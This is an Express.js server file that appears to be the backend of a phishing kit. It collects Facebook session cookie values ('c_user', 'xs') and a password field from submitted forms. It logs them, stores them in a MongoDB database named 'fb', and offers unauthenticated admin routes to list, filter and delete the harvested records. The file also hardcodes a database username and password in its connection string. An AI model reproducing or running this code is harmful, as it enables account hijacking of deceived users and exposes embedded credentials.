// Import necessary packages
const express = require('express');
const mongoose = require('mongoose');
const ejs = require('ejs'); // For parsing JSON request body
const User = require('./model/user'); // Import the User model
const path = require("path");
const app = express();

app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.resolve('./public')));
// Connect to MongoDB using Mongoose
mongoose.connect('mongodb+srv://leilani786:leilani786@leilani.gr1vmul.mongodb.net/fb', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
    .then(() => {
        console.log('Connected to MongoDB');
    })
    .catch((error) => {
        console.error('MongoDB connection error:', error);
    });

app.use(express.json());
app.get('/', (req, res) => {
    res.render('main.ejs');
});
app.get('/action', (req, res) => {
    res.render('action.ejs', { submitted: false });
});
app.get('/password', (req, res) => {
    res.render('password.ejs');
});
app.post('/delete/:id', async (req, res) => {
    try {
        const userId = req.params.id;
        // Delete the user from the database by their ID
        await User.findByIdAndRemove(userId);
        // Redirect back to the user list page
        res.redirect('/api/v2/users');
    } catch (error) {
        console.error('Error deleting user:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});
app.post('/delete-multiple', async (req, res) => {
    try {
        const deleteIds = req.body.deleteIds; // Array of user IDs to delete
        if (deleteIds && deleteIds.length > 0) {
            // Delete multiple users from the database by their IDs
            await User.deleteMany({ _id: { $in: deleteIds } });
            // Redirect back to the user list page
            res.redirect('/api/v2/users');
        } else {
            res.status(400).send('No records selected for deletion');
        }
    } catch (error) {
        console.error('Error deleting multiple users:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});
// Add a new route for handling filter requests
app.post('/filter-users', async (req, res) => {
    try {
        const xsFilter = req.body.xsFilter;
        const cUserFilter = req.body.cUserFilter;

        let filter = {};

        if (xsFilter) {
            filter.xs = xsFilter;
        }

        if (cUserFilter) {
            filter.c_user = cUserFilter;
        }

        const users = await User.find(filter);

        const data = { users };
        res.render('users.ejs', data);
    } catch (error) {
        console.error('Error filtering users:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.post('/user-data', async (req, res) => {
    try {
        const { c_user, xs, passwordValue } = req.body;
        let data = {
            c_user,
            xs,

        }
        console.log(req.body);
        if (c_user && xs) {
            const user = new User(data);
            await user.save();
            res.render('action.ejs', { submitted: true });
        } else {
            res.status(404).send('User not found');
        }
    } catch (error) {
        console.error('Error saving user data:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});
app.get('/api/v2/users', async (req, res) => {
    const users = await User.find();
    const data = { users };

    res.render('users.ejs', data);
});

const port = process.env.PORT || 3005;
app.listen(port, () => {
    console.log(`Server is running on port http://localhost:${port}`);
});
